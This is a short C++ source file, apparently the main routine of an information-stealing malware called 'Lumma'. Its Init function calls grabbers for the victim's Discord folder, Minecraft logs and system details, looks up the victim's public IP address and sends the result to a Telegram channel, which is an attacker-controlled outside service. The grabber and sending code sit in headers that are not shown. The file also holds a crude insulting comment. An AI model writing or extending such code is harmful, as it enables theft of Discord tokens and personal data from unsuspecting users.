#include "pch.h"
#include "wrappers/telegram.h"
#include "config/telegram.h"
#include "utils.h"
#include "grabbers/getinfopc.h"
#include "grabbers/minecraft.h"
#include "grabbers/discord.h"
#include "debug.h"
#include "wrappers/curl.h"

#include <iostream>
#include <thread>

// please stop being retarded 

/*
some code is copy and pasted from junipermatcha
*/

namespace Lumma {
    void Init() {
        //Debug::Initialize();
        
        grab::GetDiscordFolder();
        grab::getMinecraftLogs();
        grab::GetPCInfo();

        curl::HttpResponse res = curl::Get("https://ipinfo.io/json");

        telegram::SendMessageT(res.body);

        return;
    }
}